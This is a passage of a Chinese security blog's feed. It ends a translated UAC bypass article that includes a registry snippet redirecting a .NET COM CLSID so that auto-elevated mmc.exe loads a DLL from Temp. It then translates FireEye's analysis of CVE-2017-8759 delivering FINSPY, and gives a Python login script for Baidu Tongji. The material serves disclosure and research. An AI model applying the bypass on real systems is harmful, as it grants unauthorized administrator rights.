class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;]</span><br><span class="line">@=&quot;Microsoft Common Language Runtime Meta Data&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\InprocServer32\4.0.30319]</span><br><span class="line">@=&quot;4.0.30319&quot;</span><br><span class="line">&quot;ImplementedInThisVersion&quot;=&quot;&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\ProgID]</span><br><span class="line">@=&quot;CLRMetaData.CorRuntimeHost.2&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\Server]</span><br><span class="line">@=&quot;..\\..\\..\\..\\Temp\\test_unmanaged.dll&quot;</span><br></pre></td></tr></table></figure> <p>（注意：路径必须是相对的，否则mmc.exe会尝试加载C:\Windows\Microsoft.NET\Framework64\v4.0.30319\C:\Temp\test_unmanaged.dll）</p> <h1 id="不是安全边界"><a href="#不是安全边界" class="headerlink" title="不是安全边界"></a>不是安全边界</h1><p>微软多次申明UAC不是一个安全边界，安全从业者以更务实的角度来看它：不要信任UAC，不要用admin运行，用非admin用户运行不需要admin的任务，我非常赞同这种说法。</p> <p>但是依然很多人用admin运行所有的东西，他们都是渗透测试人员和红色组织（都是坏人）感兴趣的目标。所以我猜测还会有新的关于UAC的有趣技术。</p> <p>如果为了渗透测试，我推荐使用<a href="https://tyranidslair.blogspot.fr/2017/05/reading-your-way-around-uac-part-1.html" target="_blank" rel="noopener">@tiraniddo的例子</a>（<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1" target="_blank" rel="noopener">一个已经实现</a>，<a href="https://twitter.com/enigma0x3/status/907397236627329024" target="_blank" rel="noopener">另一个也快来了</a>），它不需要加载DLL，并且目前大部分EDR解决方案还不能捕获它。</p> <p>另外，如果你也在研究绕过UAC，这个主题外有很多资源，但是下面的必须读一下：</p> <ul> <li>@enigma0x3’s research (and his upcoming DerbyCon talk)</li> <li>@tiraniddo’s bypass techniques on UAC via the SilentCleanup task and process token reading: part 1, part 2 &amp; part 3</li> <li>@hFireF0X’s UACME project that implements most known UAC bypasses, and his posts on kernelmode</li> <li>@FuzzySec’s UAC workshop, and his Bypass-UAC project that implements several bypasses in PowerShell</li> </ul> <p>非常感谢Casey Smith(<a href="https://twitter.com/subTee" target="_blank" rel="noopener">@subtee</a>)指出.NET profiler DLL技巧，并且感谢对微软开发者找到根本原因给予的帮助，谢谢Matt Graeber (<a href="https://twitter.com/mattifestation/" target="_blank" rel="noopener">@mattifestation</a>) 的意见和review。</p> <h1 id="进展时间"><a href="#进展时间" class="headerlink" title="进展时间"></a>进展时间</h1><p>2017-05-19 发现bypass<br>2017-05-20 给MSRC发邮件 (cc’ing an MS dev as suggested by @mattifestation)<br>2017-05-22 MSRC创建主题 #38811<br>2017-05-20/23 和 MS dev讨论<br>2017-06-24  MSRC回复: “We have finished our investigation and determined this does not meet the bar for servicing downlevel. UAC is not a security boundary.”<br>2017-07-05 Stefan Kanthak绕过方案的完整披露<br>2017-09-15 发表本篇文章</p> <p>文章来源：<a href="https://offsec.provadys.com/UAC-bypass-dotnet.html" target="_blank" rel="noopener">https://offsec.provadys.com/UAC-bypass-dotnet.html</a></p> ]]></content>          <summary type="html">            &lt;p&gt;.NET框架可以通过用户自定义环境变量和CLSID注册表项来加载profiler DLL或者COM组件DLL，甚至当前进程是提权的。这种行为可以被利用来绕过Windows 7到10（包括最近的RS3）系统的默认UAC设置，如通过自动提权.NET进程（MMC管理单元）来加载任意的DLL。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="bypassUAC" scheme="https://anhkgg.github.io/tags/bypassUAC/"/>            <category term="UAC" scheme="https://anhkgg.github.io/tags/UAC/"/>            <category term=".NET" scheme="https://anhkgg.github.io/tags/NET/"/>            <category term="mmc.exe" scheme="https://anhkgg.github.io/tags/mmc-exe/"/>        </entry>      <entry>     <title>翻译：FireEye揭露CVE-2017-8759：分发FINSPY的0day</title>     <link href="https://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/"/>     <id>https://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/</id>     <published>2017-09-14T02:12:47.000Z</published>     <updated>2017-09-14T02:26:09.266Z</updated>          <content type="html"><![CDATA[<p>2017.9.12 | by Genwei Jiang, Ben Read, Tom Bennett | Threat Research</p> <p>FIreEye近期检测到一个恶意的利用CVE-2017-8759漏洞的微软Office RTF文档。</p> <p>CVE-2017-8759是SOAP WSDL分析器代码注入漏洞，在解析SOAP WSDL定义的内容中它允许攻击者注入任意代码。</p> <p>FireEye分析了这个攻击者使用的微软Word文档，它利用任意代码注入来下载和执行一个包含PowerShell命令的VB脚本。</p> <a id="more"></a> <p>FireEye将这个漏洞的细节分享给了微软，然后协调了信息披露的时间，发布了修补该漏洞的补丁和安全指导，可以在这里找到它们。</p> <p>FireEye的邮件，终端以及网络产品都已经可以检测该恶意文档。</p> <h1 id="针对俄语目标的漏洞"><a href="#针对俄语目标的漏洞" class="headerlink" title="针对俄语目标的漏洞"></a>针对俄语目标的漏洞</h1><p>该恶意文档（Проект.doc）（MD5：fe5c4d6bb78e170abf5cf3741868ea4c）可能是针对俄语目标的。</p> <p>在CVE-2017-8759利用成功之后，该文档会下载多个组件（后面有详情），最终会加载一个FINSPY payload（MD5：a7b990d5f57b244dd17e9a937a41e7f5）。</p> <p>FINSPY恶意软件，也叫做FinFisher或者WingBird，是可以购买的用于“合法窃听”的软件。基于这个和之前FINSPY的使用，我们有更多的信心说这个恶意文档是一个针对俄语目标的网络间谍活动。</p> <p>根据FireEye动态威胁情报系统的更多的检测，根据不同client的行为关联，发现该样本在2017年7月就已经出现了。</p> <h1 id="CVE-2017-8759-WSDL-解析器代码注入"><a href="#CVE-2017-8759-WSDL-解析器代码注入" class="headerlink" title="CVE-2017-8759 WSDL 解析器代码注入"></a>CVE-2017-8759 WSDL 解析器代码注入</h1><p>代码注入漏洞是存在于WSDL解析模块的PrintClientProxy方法中（<a href="http://referencesource.microsoft.com/" target="_blank" rel="noopener">http://referencesource.microsoft.com/</a> - System.Runtime.Remoting/metadata/wsdlparser.cs,6111）。</p> <p>IsValidUrl没有对提供的包含CRLF序列（换行回车）的数据进行正确的校验，这就允许了攻击者注入和执行任意代码。部分漏洞代码如图1所示。</p> <p><img src="/img/fireeye-CVE-2017-8759-1.png" alt="图1. WSDL解析器的漏洞"></p> <p>当在SOAP响应中多个address被定义时，代码会在第一个地址后插入“//base.ConfigureProxy(this.GetType(),”字符串，注释了后面剩余的address。然而，如果恶意的address的还有一个CRLF，后面的代码就不会被注释。</p> <p>图2展示了对CRLF缺乏验证，System.Diagnostics.Process.Start方法会被注入。生成的代码会被.NET框架的csc.exe编译，然后作为DLL加载到Office可执行程序中。</p> <p><img src="/img/fireeye-CVE-2017-8759-2.png" alt="图2. SOAP定义和产生的代码"> </p> <h1 id="在外散播的攻击"><a href="#在外散播的攻击" class="headerlink" title="在外散播的攻击"></a>在外散播的攻击</h1><p>FireEye检测到在外散播的攻击使用的是富文本(RTF)格式的文档，和我们之前报告的CVE-2017-0199文档类似。</p> <p>该恶意样本包含一个是利用更方便的嵌入的SOAP Moniker，如图3所示。</p> <p><img src="/img/fireeye-CVE-2017-8759-3.png" alt="图3. SOAP Moniker"> </p> <p>样本从一个攻击者控制的服务器接收恶意的SOAP WSDL定义的数据。.NET框架中System.Runtime.Remoting.ni.dll中实现的WSDL解析器会解析内容然后生成一个.cs源代码到工作目录中。</p> <p>接着.NET框架的csc.exe编译该代码生成一个名字像http[url path].dll的库文件。然后微软的Office会加载这个库，完成漏洞利用。图4展示了漏洞利用加载的示例库文件。</p> <p><img src="/img/fireeye-CVE-2017-8759-4.png" alt="图4. 被加载的DLL">  </p> <p>在成功的利用中，注入的代码会创建一个新的进程，利用mshta.exe会从同一个服务器接收一个叫做“word.db”的HTA脚本。</p> <p>HTA脚本会从磁盘删除源代码，编译的DLL和PDB文件，然后下载执行叫做“left.jpg”的FINSPY恶意软件，虽然它是.jpg后缀名，类型是image/jpeg，但其实是个可执行文件。</p> <p>图5展示了恶意软件传输的PCAP细节。</p> <p><img src="/img/fireeye-CVE-2017-8759-5.png" alt="图5. 实时的请求"> </p> <p>该恶意软件会被放在%appdata%\Microsoft\Windows\OfficeUpdte-KB[ 6 random numbers ].exe中。图6展示了在Process Monitor中的进程创建链。</p> <p><img src="/img/fireeye-CVE-2017-8759-6.png" alt="图6. 进程创建链"> </p> <h1 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h1><p>Left.jpg (md5: a7b990d5f57b244dd17e9a937a41e7f5)是FINSPY的变体。它利用高强度的混淆代码开发了一个内置虚拟机以及其他的一些反分析技术，来增加逆向的难度。比如另个月单独的反分析技术是，它会解析自己的全路径，然后搜索是否存在他自己的MD5哈希字符串。很多分析工具和沙箱为了能保证准确的唯一文件名会重命名样本文件为MD5哈希。该样本会使用WininetStartupMutex0的mutex来保证单实例。</p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CVE-2017-8759是2017年FireEye发现的第二个分发FINSPY的0day。这个揭露说明签名资源对“合法窃听”的公司和他们用户都是可用的。此外，FINSPY买了多个不同的客户端，漏洞可以用于攻击其他的目标。</p> <p>CVE-2017-8759可能已经被更多的攻击者利用了。尽管我们没有证据，但是在2017年7月分析中，CVE-2017-0199已经被金融攻击者用来分发FINSPY。如果FINSPY的攻击者有之前使用的相同源码的漏洞，那么可能代码已经被卖给了更多的攻击者。</p> <h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>感谢Dhanesh Kizhakkinan, Joseph Reyes, FireEye Labs Team, FireEye FLARE Team and FireEye iSIGHT Intelligence发布这个博客。同样感谢MSRC协助解决这个问题的工作人员。</p> <p>参考：<a href="http://blog.sina.com.cn/s/blog_67ae918d0102e1l9.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_67ae918d0102e1l9.html</a></p> <p>文章来源：<br><a href="https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html</a></p> <p>转载请注明：<a href="http://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/">http://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/</a></p> ]]></content>          <summary type="html">            &lt;p&gt;2017.9.12 | by Genwei Jiang, Ben Read, Tom Bennett | Threat Research&lt;/p&gt; &lt;p&gt;FIreEye近期检测到一个恶意的利用CVE-2017-8759漏洞的微软Office RTF文档。&lt;/p&gt; &lt;p&gt;CVE-2017-8759是SOAP WSDL分析器代码注入漏洞，在解析SOAP WSDL定义的内容中它允许攻击者注入任意代码。&lt;/p&gt; &lt;p&gt;FireEye分析了这个攻击者使用的微软Word文档，它利用任意代码注入来下载和执行一个包含PowerShell命令的VB脚本。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="FireEye" scheme="https://anhkgg.github.io/tags/FireEye/"/>            <category term="cve20178759" scheme="https://anhkgg.github.io/tags/cve20178759/"/>            <category term="FINSPY" scheme="https://anhkgg.github.io/tags/FINSPY/"/>        </entry>      <entry>     <title>pylogin系列之搞定百度统计</title>     <link href="https://anhkgg.github.io/pylogin-baidutongji-login-analyze/"/>     <id>https://anhkgg.github.io/pylogin-baidutongji-login-analyze/</id>     <published>2017-08-21T16:01:25.000Z</published>     <updated>2017-08-22T05:31:17.910Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这次分析的百度统计登录接口，算是这几个中最简单的了。</p> <p>但是学到了一个新东西，叫做js模板，搞web的同学应该知道，我这种web半吊子第一次见，非常有意思。</p> <a id="more"></a> <p>工具：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. chrome/firefox</span><br><span class="line">2. f12，network</span><br><span class="line">3. python：requests、re</span><br></pre></td></tr></table></figure> <h1 id="登录接口"><a href="#登录接口" class="headerlink" title="登录接口"></a>登录接口</h1><p>打开百度统计首页<code>https://tongji.baidu.com/web/welcome/login</code>，点开登录框，f12。尝试输入之后，查看发送的数据。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Request URL:https://cas.baidu.com/?action=login</span><br><span class="line">Request Method:POST</span><br><span class="line">Status Code:200 OK</span><br><span class="line"></span><br><span class="line">appscope[]:6</span><br><span class="line">appscope[]:7</span><br><span class="line">appscope[]:12</span><br><span class="line">appid:12</span><br><span class="line">entered_login:anhkgg //名字</span><br><span class="line">entered_password:1111111111111111 //密码</span><br><span class="line">entered_imagecode:9mxm //验证码</span><br><span class="line">charset:utf-8</span><br><span class="line">fromu:https://tongji.baidu.com/web/welcome/loginback</span><br><span class="line">selfu:https://tongji.baidu.com/web/welcome/login</span><br><span class="line">senderr:1</span><br></pre></td></tr></table></figure> <p>除了上面注释的需要输入的三个字段，其他字段意义都不明确，偷点懒，多次尝试后发现其他字段不会变化，那么就用固定值了。</p> <p>点击验证码，看到网络，拿到获取验证码的请求，key使用10位时间戳。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https://cas.baidu.com/?action=image&amp;key=1503151305</span><br></pre></td></tr></table></figure> <p>所以登录接口就出来了，<code>vcode</code>需要人工输入。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://cas.baidu.com/?action=image&amp;key=&apos; + time_stamp(10)</span><br><span class="line">r = self.s.get(url)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &apos;appscope[]&apos;:6,</span><br><span class="line">    &apos;appscope[]&apos;:7,</span><br><span class="line">    &apos;appscope[]&apos;:12,</span><br><span class="line">    &apos;appid&apos;:12,</span><br><span class="line">    &apos;entered_login&apos;:name,</span><br><span class="line">    &apos;entered_password&apos;:pwd,</span><br><span class="line">    &apos;entered_imagecode&apos;:vcode,</span><br><span class="line">    &apos;charset&apos;:&apos;utf-8&apos;,</span><br><span class="line">    &apos;fromu&apos;:&apos;https://tongji.baidu.com/web/welcome/loginback&apos;,</span><br><span class="line">    &apos;selfu&apos;:&apos;https://tongji.baidu.com/web/welcome/login&apos;,</span><br><span class="line">    &apos;senderr&apos;:1,</span><br><span class="line">    &#125;        </span><br><span class="line">url = &apos;https://cas.baidu.com/?action=login&apos;</span><br><span class="line">r = self.s.post(url, data = payload)</span><br></pre></td></tr></table></figure> <p>接着看看登录返回状态，如果失败了，返回数据中包含如下数据：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;ReFresh&quot; content=&quot;0; url=https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132&quot; /&gt;</span><br><span class="line">&lt;title&gt;正在处理...&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;                </span><br><span class="line">    var url=&quot;https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132&quot;;</span><br><span class="line">    location.href=url;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure> <p>然后浏览器加载该url，显示错误提示信息</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Request URL:https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132</span><br><span class="line">Request Method:GET</span><br><span class="line"></span><br><span class="line">fromu:https://tongji.baidu.com/web/welcome/loginback</span><br><span class="line">e:用户名密码错误</span><br><span class="line">un:anhkgg</span><br><span class="line">aid:12</span><br><span class="line">errno:132</span><br></pre></td></tr></table></figure> <p>其中<code>e</code>是错误提示信息，errno是错误号。</p> <p>登录成功返回数据如下，没有<code>e</code>错误信息。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;                </span><br><span class="line">var url=&quot;http://cas.baidu.com/?action=check&amp;appid=12&amp;u=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback%3Fcastk%3Dc4086gh7e82166251d451&amp;fromLogin=1&quot;;</span><br><span class="line">location.href=url;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure> <p>那么就可以先通过正则拿到url，通过搜索url是否有<code>e</code>判断是否登录成功，并且拿到提示信息。成功则继续访问该url跳转到成功页面，获取其他需要的信息。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(r&apos;var url=&quot;(.*?)&quot;;&apos;)</span><br><span class="line">cont = re.search(pattern, r.content)</span><br><span class="line">url = cont.group(1)</span><br><span class="line">pattern = re.compile(r&apos;e=(.*?)&amp;un=&apos;)</span><br><span class="line">cont = re.search(pattern, url)</span><br><span class="line">if cont != None:</span><br><span class="line">    r = urllib.unquote(cont.group(1)) #失败</span><br><span class="line">    return utf2gbk(r)        </span><br><span class="line"></span><br><span class="line">r = self.s.get(url) # 成功</span><br></pre></td></tr></table></figure> <h1 id="js模板"><a href="#js模板" class="headerlink" title="js模板"></a>js模板</h1><p>这里比较意思的是使用的js模板来生成登录表单。</p> <p>具体js模板使用看<a href="http://freshflower.iteye.com/blog/2120268" target="_blank" rel="noopener">这里</a>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script id=&quot;LoginTemplate&quot; type=&quot;text/template&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id=&quot;LoginContainer&quot; class=&quot;login-dialog&quot;&gt;</span><br><span class="line">        &lt;div id=&quot;TopTmp&quot;&gt;&amp;nbsp;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        if (this.isIco == 1) &#123;</span><br><span class="line">        &lt;div id=&quot;LoginMain&quot; class=&quot;ico-login clearfix&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;visitor-login-tab&quot; id=&quot;LoginTab&quot;&gt;请输入查看密码&lt;/div&gt;</span><br><span class="line">            &lt;div id=&quot;LoginInput&quot; class=&quot;login-input&quot;&gt;</span><br><span class="line">                if (this.errMsg) &#123;</span><br><span class="line">                &lt;div id=&quot;ErrorTip&quot; class=&quot;error&quot;&gt;#&#123;this.errMsg&#125;&lt;/div&gt;</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">        &lt;div id=&quot;LoginMain&quot; class=&quot;login-main&quot;&gt;</span><br><span class="line">            </span><br><span class="line">                &lt;form method=&quot;post&quot; action=&quot;#&#123;this.loginAction&#125;&quot;&gt;</span><br><span class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;12&quot; id=&quot;Appid&quot; name=&quot;appid&quot;&gt;</span><br><span class="line">                    ...</span><br><span class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;#&#123;this.selfUrl&#125;&quot; name=&quot;selfu&quot; /&gt;</span><br><span class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;1&quot; name=&quot;senderr&quot; /&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;dialog-bottom-bg&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure> <p>从上面代码中可以看到，某些标签的值使用了<code>#{this.xxx}</code>这样的语法，不是直接填入的具体内容，更加灵活，扩展更容易。</p> <p>然后在点击登录按钮之后，通过函数格式化一个全局定义的变量来生成的登录表单。具体如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//全局数据，用于替换表单中的this.xxx</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">VAR = &#123;</span><br><span class="line">    webMasterRegister: &quot;https://tongji.baidu.com/web/register&quot;,</span><br><span class="line">    customRegister: &quot;https://u.baidu.com/ucweb/?module=Reguser&amp;controller=reg&amp;action=index&amp;appid=3&quot;,</span><br><span class="line">    union_forget: &quot;http://union.baidu.com/findPassword!input.action&quot;,</span><br><span class="line">    shifen_forget: &quot;https://aq.baidu.com/new/#/findpwd&quot;,</span><br><span class="line">    uc_forget: &quot;https://aq.baidu.com/new/#/findpwd&quot;,</span><br><span class="line">    waiting_img_src: &quot;/web/img/loadingImage.gif&quot;,</span><br><span class="line">    app_id: &quot;0&quot;,</span><br><span class="line">    errMsg: &quot;&quot;,</span><br><span class="line">    loginUrl: &quot;/web/welcome/login&quot;,</span><br><span class="line">    loginAction: &quot;https://cas.baidu.com/?action=login&quot;,</span><br><span class="line">    userName: &quot;&quot;,</span><br><span class="line">    authCode: &quot;https://cas.baidu.com/?action=image&amp;key=1503151305&quot;,</span><br><span class="line">    registerUrl: &quot;/web/register&quot;,</span><br><span class="line">    fromUrl: &quot;https://tongji.baidu.com/web/welcome/loginback&quot;,</span><br><span class="line">    selfUrl: &quot;https://tongji.baidu.com/web/welcome/login&quot;,</span><br><span class="line">    isIco: &quot;0&quot;,</span><br><span class="line">    webmasterUserNum: &quot;2097176&quot;,</span><br><span class="line">    customerUserNum: &quot;2270927&quot;,</span><br><span class="line">    mtjUserNum: &quot;2262130&quot;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure> <p>然后在login.js中，通过下面的函数来初始化表单，并且显示。</p> <p>其中<code>n.format(&quot;LoginTemplate&quot;, VAR)</code>用于格式化VAR定义的数据到表单的数据中。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">, h = function() &#123;</span><br><span class="line">    var e = t(&quot;.login-trigger&quot;).eq(0);</span><br><span class="line">    e.on(&quot;click&quot;, function() &#123;</span><br><span class="line">        s || (s = new i(&#123;</span><br><span class="line">            width: 345,</span><br><span class="line">            isModal: !0,</span><br><span class="line">            titleText: &quot;&quot;,</span><br><span class="line">            isSingle: !0,</span><br><span class="line">            content: n.format(&quot;LoginTemplate&quot;, VAR) //初始化登录表单数据</span><br><span class="line">        &#125;),</span><br><span class="line">        loginController.init()),</span><br><span class="line">        s.show()</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure> <p>而在format具体如何替换的，就随意实现了，这里就不在具体分析，有兴趣跟着分析的同学可以去看看common.js中的代码。</p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>百度统计接口非常简单，密码未做变换，使用https。</p> <p>登录之后具体做什么也不在分析。</p> <p>预告下次做百度主站的登录分析，简单看了下，非常…复杂！</p> <p>安利一下公众号：汉客儿</p> <p><img src="/img/wechat_public.png" alt="img"></p> <p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-baidutongji-login-analyze/">https://anhkgg.github.io/pylogin-baidutongji-login-analyze/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;这次分析的百度统计登录接口，算是这几个中最简单的了。&lt;/p&gt; &lt;p&gt;但是学到了一个新东西，叫做js模板，搞web的同学应该知道，我这种web半吊子第一次见，非常有意思。&lt;/p&gt;          </summary>            <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>                 <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>            <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>            <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>            <category term="v2ex" scheme="https://anhkgg.github.io/tags/v2ex/"/>            <category term="自动领币" scheme="https://anhkgg.github.io/tags/%E8%87%AA%E5%8A%A8%E9%A2%86%E5%B8%81/"/>        </entry>      <entry>     <title>pylogin系列之V2EX自动领币消息提醒</title>     <link href="https://anhkgg.github.io/pylogin-v2ex-login-analyze/"/>     <id>https://anhkgg.github.io/pylogin-v2ex-login-analyze/</id>     <published>2017-08-18T13:09:58.000Z</published>     <updated>2017-08-22T05:31:40.082Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" 